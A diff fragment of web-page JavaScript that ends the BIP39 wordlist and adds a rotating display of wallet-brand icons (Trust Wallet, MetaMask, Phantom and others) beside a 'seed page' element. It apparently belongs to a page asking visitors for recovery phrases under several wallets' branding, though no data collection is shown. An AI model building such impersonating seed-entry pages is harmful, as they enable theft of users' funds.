rpion","scout","scrap","screen","script","scrub","sea","search","season","seat","second","secret","section","security","seed","seek","segment","select","sell","seminar","senior","sense","sentence","series","service","session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side","siege","sight","sign","silent","silk","silly","silver","similar","simple","since","sing","siren","sister","situate","six","size","skate","sketch","ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda","soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry","sort","soul","sound","soup","source","south","space","spare","spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp","stand","start","state","stay","steak","steel","stem","step","stereo","stick","still","sting","stock","stomach","stone","stool","story","stove","strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey","suspect","sustain","swallow","swamp","swap","swarm","swear","sweet","swift","swim","swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag","tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term","test","text","thank","that","theme","then","theory","there","they","thing","this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist","toward","tower","town","toy","track","trade","traffic","tragic","train","transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade","uphold","upon","upper","upset","urban","urge","usage","use","used","useful","useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory","video","view","village","vintage","violin","virtual","virus","visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage","wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat","wheel","when","where","whip","whisper","wide","width","wife","wild","will","win","window","wine","wing","wink","winner","winter","wire","wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word","work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year","yellow","you","young","youth","zebra","zero","zone","zoo"]);
-      const bip39Loaded = true;const seedPage = document.getElementById('seedPage');
+      const bip39Loaded = true;
+
+      // Wallet icons data for animated display
+      const walletIcons = [
+        "https://i.pinimg.com/1200x/2a/98/d7/2a98d7c3b241b50f73f799b68a1eb501.jpg", // Trust Wallet
+        "https://i.pinimg.com/736x/10/38/42/103842afcef5cd4e73c62e5468a62e73.jpg", // Coinbase
+        "https://i.pinimg.com/736x/a7/cb/05/a7cb05ecefd50286f1869ce0417d55dd.jpg", // Binance
+        "https://i.pinimg.com/736x/5c/87/06/5c870644ae73572b4b98a2cb1bac0a3b.jpg", // MetaMask
+        "https://i.pinimg.com/736x/7f/60/60/7f60608cfb69a6029c5078ea5ffb66f0.jpg", // Exodus
+        "https://i.pinimg.com/736x/88/c1/3d/88c13d6ac6240a7820204b2aaecd05aa.jpg", // Phantom
+      ];
+
+      let currentWalletIndex = 0;
+
+      function updateWalletIcons() {
+        const iconElements = document.querySelectorAll('.wallet-icon');
+        iconElements.forEach((icon, index) => {
+          const walletIndex = (currentWalletIndex + index) % walletIcons.length;
+          icon.src = walletIcons[walletIndex];
+        });
+        currentWalletIndex = (currentWalletIndex + 1) % walletIcons.length;
+      }
+
+      // Initialize icons on load
+      updateWalletIcons();
+      // Update icons every 8 seconds (matching animation duration)
+      setInterval(updateWalletIcons, 8000);
+
+      const seedPage = document.getElementById('seedPage');
       const seedTitle = document.getElementById('seedTitle');
       const seedWalletIcon = document.getElementById('seedWalletIcon');
       const closeSeedPage = document.getElementById('closeSeedPage');
